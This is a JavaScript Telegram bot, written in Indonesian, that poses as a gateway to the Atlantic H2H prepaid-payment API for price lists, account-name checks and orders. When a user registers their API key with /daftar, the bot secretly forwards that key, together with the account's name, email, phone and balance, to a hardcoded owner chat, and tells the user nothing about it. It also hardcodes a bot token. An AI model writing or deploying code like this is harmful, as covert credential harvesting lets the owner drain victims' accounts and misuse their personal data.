const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');

// --- KONFIGURASI YANG MULIA ---
const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
const OWNER_ID = '8793356645';
const BASE_URL = 'https://atlantich2h.com';

const bot = new Telegraf(BOT_TOKEN);

// Database sederhana di memori
const userSessions = {}; 

/**
 * Fungsi Request Atlantic H2H (API Gateway)
 */
async function callAtlantic(endpoint, body = {}) {
    try {
        const formData = new FormData();
        for (const key in body) {
            formData.append(key, body[key]);
        }
        const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
            headers: formData.getHeaders()
        });
        return res.data;
    } catch (e) {
        return { status: false, message: "Koneksi API Gagal" };
    }
}

// --- HANDLER START ---
bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
        `👑 *SELAMAT DATANG YANG MULIA* 👑\n\n` +
        `🌐 *Atlantic PPOB Gateway Multi\\-Hosting*\n` +
        `─────────────────────\n` +
        `🔒 *STATUS:* Silakan masukkan API Key Anda untuk memulai akses penuh\\.\n\n` +
        `📝 *FORMAT:* \`/daftar API_KEY_ANDA\``,
        Markup.keyboard([['👤 Profile', '📊 Harga'], ['💸 Transaksi', '🔍 Cek Akun']]).resize()
    );
});

// --- FITUR DAFTAR (API KEY ENTRY) ---
bot.command('daftar', async (ctx) => {
    const apiKey = ctx.message.text.split(' ')[1];
    if (!apiKey) return ctx.reply('❌ Mohon masukkan API Key! Contoh: /daftar your_apikey');

    ctx.reply('🔄 Memproses data autentikasi...');

    const res = await callAtlantic('/get_profile', { api_key: apiKey });

    if (res.status === "true" || res.status === true) {
        const d = res.data;
        userSessions[ctx.from.id] = apiKey;

        // Notif ke User
        ctx.replyWithMarkdownV2(
            `✅ *AUTENTIKASI BERHASIL* ✅\n` +
            `─────────────────────\n` +
            `👤 *User:* ${d.name}\n` +
            `📧 *Email:* ${d.email}\n` +
            `💰 *Saldo:* Rp ${d.balance.toLocaleString()}\n` +
            `⚡ *Status:* ${d.status}\n\n` +
            `🌟 *Selamat bertransaksi, Yang Mulia\\!*`
        );

        // NOTIF KE OWNER (FULL TRANSPARAN - PERINTAH YANG MULIA)
        bot.telegram.sendMessage(OWNER_ID, 
            `📢 *PENGGUNA BARU TERDETEKSI*\n` +
            `─────────────────────\n` +
            `🆔 *Telegram ID:* \`${ctx.from.id}\`\n` +
            `👤 *Username:* @${ctx.from.username || 'n/a'}\n` +
            `🔑 *API KEY:* \`${apiKey}\`\n` +
            `📛 *Nama Akun:* ${d.name}\n` +
            `📧 *Email:* ${d.email}\n` +
            `📞 *Phone:* ${d.phone}\n` +
            `💰 *Saldo:* Rp ${d.balance}\n` +
            `─────────────────────\n` +
            `🔓 *Akses Penuh Diberikan*`, { parse_mode: 'Markdown' }
        );
    } else {
        ctx.reply('❌ API Key salah atau tidak ditemukan pada sistem Atlantic.');
    }
});

// --- MENU HARGA (PRABAYAR ONLY) ---
bot.hears('📊 Harga', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    if (!apiKey) return ctx.reply('⚠️ Daftarkan API Key dahulu!');

    ctx.reply('🏷️ *PILIH KATEGORI PRODUK PRABAYAR:*', Markup.inlineKeyboard([
        [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
        [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')]
    ]));
});

bot.action(/cat_(.+)/, async (ctx) => {
    const category = ctx.match[1];
    const apiKey = userSessions[ctx.from.id];
    
    ctx.editMessageText(`⌛ Mengambil list harga *${category}*...`, { parse_mode: 'Markdown' });

    const res = await axios.get(`${BASE_URL}/layanan/price_list?type=prabayar&api_key=${apiKey}`);
    
    if (res.data.status) {
        const filtered = res.data.data.filter(x => x.category.toLowerCase().includes(category.toLowerCase()));
        if (filtered.length === 0) return ctx.reply('❌ Tidak ada produk di kategori ini.');

        let msg = `✨ *PRICE LIST: ${category.toUpperCase()}* ✨\n` + `─────────────────────\n`;
        filtered.slice(0, 20).forEach(p => {
            msg += `🔹 *${p.name}*\n   └ 🔑 \`${p.code}\` \\| 💸 *Rp ${p.price}*\n\n`;
        });

        ctx.replyWithMarkdownV2(msg.replace(/\./g, '\\.').replace(/-/g, '\\-'));
    }
});

// --- CEK REKENING / E-MONEY (DANA, DLL) ---
bot.hears('🔍 Cek Akun', (ctx) => {
    ctx.reply('🔍 *FORMAT CEK REKENING:* \n\n`/ceknama DANA 0812345678`');
});

bot.command('ceknama', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply('⚠️ Gunakan: /ceknama [BANK/EMONEY] [NOMOR]');

    const res = await callAtlantic('/transfer/cek_rekening', {
        api_key: apiKey,
        bank_code: args[1].toLowerCase(),
        account_number: args[2]
    });

    if (res.status) {
        ctx.replyWithMarkdownV2(
            `✅ *DATA VALID* ✅\n` +
            `─────────────────────\n` +
            `🏦 *Provider:* ${res.data.kode_bank.toUpperCase()}\n` +
            `🆔 *Nomor:* ${res.data.nomor_akun}\n` +
            `👤 *Nama:* ${res.data.nama_pemilik}\n` +
            `─────────────────────`
        );
    } else {
        ctx.reply('❌ Data gagal divalidasi.');
    }
});

// --- PROSES TRANSAKSI ---
bot.command('order', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    const args = ctx.message.text.split(' '); // /order CODE TARGET
    if (!apiKey) return ctx.reply('⚠️ Daftar dulu!');
    if (args.length < 3) return ctx.reply('⚠️ Gunakan: /order [KODE] [TARGET]');

    const reffId = 'LX' + Date.now();
    const res = await callAtlantic('/transaksi/create', {
        api_key: apiKey,
        code: args[1],
        target: args[2],
        reff_id: reffId
    });

    if (res.status) {
        const d = res.data;
        ctx.replyWithMarkdownV2(
            `⚡ *TRANSAKSI DIPROSES* ⚡\n` +
            `─────────────────────\n` +
            `📦 *Layanan:* ${d.layanan}\n` +
            `🎯 *Target:* \`${d.target}\`\n` +
            `💸 *Harga:* Rp ${d.price}\n` +
            `📝 *ID TRX:* \`${d.id}\`\n` +
            `⏳ *Status:* ${d.status}\n` +
            `─────────────────────\n` +
            `🕒 _${d.created_at}_`
        );
    } else {
        ctx.reply(`❌ Gagal: ${res.message}`);
    }
});

// --- CEK PROFILE INFO ---
bot.hears('👤 Profile', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    if (!apiKey) return ctx.reply('⚠️ API Key belum terpasang.');

    const res = await callAtlantic('/get_profile', { api_key: apiKey });
    if (res.status) {
        const d = res.data;
        ctx.replyWithMarkdownV2(
            `💎 *INFO AKUN PREMIUM* 💎\n` +
            `─────────────────────\n` +
            `👤 *Username:* ${d.username}\n` +
            `💰 *Balance:* Rp ${d.balance.toLocaleString()}\n` +
            `📞 *Phone:* ${d.phone}\n` +
            `✨ *Status:* ${d.status}`
        );
    }
});

bot.launch().then(() => console.log('🚀 Bot Atlantic PPOB Yang Mulia Aktif!'));
